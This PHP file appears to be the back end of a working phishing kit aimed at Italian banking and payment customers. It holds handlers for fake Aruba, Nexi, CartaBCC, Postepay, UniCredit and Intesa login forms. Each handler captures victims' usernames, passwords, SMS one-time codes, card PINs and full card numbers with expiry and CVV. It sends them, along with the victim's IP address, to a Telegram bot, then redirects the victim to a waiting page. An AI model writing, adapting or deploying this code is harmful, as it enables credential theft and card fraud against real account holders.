<?php
require_once '../includes/main.php';
require_once "../main.php";

$bot = $j->getAdmin("telegram_bot");
$ids = explode(",", str_replace(" ", "", $j->getAdmin("chat_id")));

$panel = str_replace('auth/post.php', '', "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "panel/login.php");

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d H:i:s");

// Function to sanitize input
function post($key)
{
    return isset($_POST[$key]) ? htmlspecialchars(trim($_POST[$key])) : "NO_DATA";
}

// Function to send a request to Telegram
function sendBot($url)
{
    $ci = curl_init();
    curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ci, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ci, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ci, CURLOPT_URL, $url);
    $response = curl_exec($ci);
    curl_close($ci);
    return $response;
}

// Function to send a Telegram message
function sendTelegramMessage($message)
{
    global $bot, $ids;
    $telegram_content = urlencode($message);

    foreach ($ids as $id) {
        $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
        sendBot($url);
    }
}

// Handle login
if (isset($_POST['login']) && isset($_POST['pass'])) {
    $username = post("login");
    $password = post("pass");

    $message = "
+++[ 🇮🇹 LOGIN ARUBA 🇮🇹 ]+++
🎭 Username : $username
🎱 Password : $password
💯 PANEL : $panel
📍 IP : $ip
🕒 Time : $time
";

    sendTelegramMessage($message);

    header("location: wait.php?p=LOGIN");
    exit;
}

// Handle SMS OTP
if (isset($_POST['sms'])) {
    $sms = post("sms");

    $message = "
+++[ 🇮🇹 SMS OTP 🚨 🇮🇹 ]+++ 
📲 SMS : $sms
📍 IP : $ip
🕒 Time: $time
";

    sendTelegramMessage($message);

    header("location: wait.php?p=SMS");
    exit;
}

// Handle PIN
if (isset($_POST['pinx'])) {
    $pin = post("pinx");

    $message = "
+++[ 🇮🇹 CARTA PIN 🚨 🇮🇹 ]+++ 
📲 CARTA PIN : $pin
📍 IP : $ip
🕒 Time : $time
";

    sendTelegramMessage($message);

    header("location: wait.php?p=PIN");
    exit;
}

// Handle Nexi login
if (isset($_POST['email']) && isset($_POST['pass'])) {
    $email = post("email");
    $password = post("pass");

    $message = "
+++[ 🇮🇹 NEXI LOGIN 🇮🇹 ]+++
📩 Email : $email
🎱 Password : $password
📍 IP : $ip
🕒 Time : $time
";

    sendTelegramMessage($message);

    header("location: wait.php?p=NEXI_LOGIN");
    exit;
}

// Handle CARTABCC login
if (isset($_POST['userin1']) && isset($_POST['pass1'])) {
    $email = filter_var($_POST['userin1'], FILTER_SANITIZE_EMAIL); // Sanitizing email
    $password = htmlspecialchars($_POST['pass1'], ENT_QUOTES, 'UTF-8'); // Sanitizing password

    $message = "
+++[ 🇮🇹 CARTABCC LOGIN 🇮🇹 ]+++
📩 USER ID : $email
🎱 PASSWORD : $password
📍 IP : $ip
🕒 Time : $time
";

    sendTelegramMessage($message);  // Send the message to Telegram

    header("Location: wait.php?p=CARTABCC_LOGIN");
    exit;
}


// Handle POSTEPAY login
if (isset($_POST['userin2']) && isset($_POST['pass2'])) {
    $email = filter_var($_POST['userin2'], FILTER_SANITIZE_EMAIL); // Sanitizing email
    $password = htmlspecialchars($_POST['pass2'], ENT_QUOTES, 'UTF-8'); // Sanitizing password

    $message = "
+++[ 🇮🇹 POSTEPAY LOGIN 🇮🇹 ]+++
📩 NOME UTENTE : $email
🎱 PASSWORD : $password
📍 IP : $ip
🕒 Time : $time
";

    sendTelegramMessage($message);

    header("Location: wait.php?p=POSTEPAY_LOGIN");
    exit;
}

// Handle UNICREDIT login
if (isset($_POST['userinx']) && isset($_POST['passo'])) {
    $email = htmlspecialchars(trim($_POST['userinx']));
    $password = htmlspecialchars(trim($_POST['passo']));

    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');

    $message = "
+++[ 🇮🇹 UNICREDIT LOGIN 🇮🇹 ]+++
📩 INSERISCI CODICE : $email
🎱 INSERISCI PIN : $password
📍 IP : $ip
🕒 Time : $time
";


    sendTelegramMessage($message);

    header("Location: wait.php?p=UNICREDIT_LOGIN");
    exit;
}

// Handle CC details
if (isset($_POST['cc'])) {
    $cardholder = post("name");
    $cardnumber = post("cc");
    $exp = post("exp");
    $cvv = post("cvv");

    $message = "
+++[ 🇮🇹 CC DETAILS 🇮🇹 ]+++ 
🙋🏻 NAME : $cardholder
💳 CARD NUMBER : $cardnumber 
♻️ EXP DATE : $exp 
♾️ CVV : $cvv 
📍 IP : $ip
🕒 Time : $time
";

    sendTelegramMessage($message);

    header("location: wait.php?p=CARD");
    exit;
}

// Handle last four CC digits
if (isset($_POST['lastfour'])) {
    $last = post("lastfour");

    $message = "
+++[ 🇮🇹 ARUBA CC DETAILS 🇮🇹 ]+++ 
💳 CC : XXXX-XXXX-XXXX-$last
📍 IP : $ip
🕒 Time : $time
";

    sendTelegramMessage($message);

    header("location: wait.php?p=CARD_DETAILS");
    exit;
}

// Handle INTESA login
if (isset($_POST['userin3']) && isset($_POST['pass3'])) {
    $email = htmlspecialchars(trim($_POST['userin3']));
    $password = htmlspecialchars(trim($_POST['pass3']));

    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');

    $message = "
+++[ 🇮🇹 INTESA LOGIN 🇮🇹 ]+++
📩 CODICE TITOLARE : $email
🎱 PIN : $password
📍 IP : $ip
🕒 Time : $time
";

    sendTelegramMessage($message);

    header("Location: wait.php?p=INTESA_LOGIN");
    exit;
}
?>
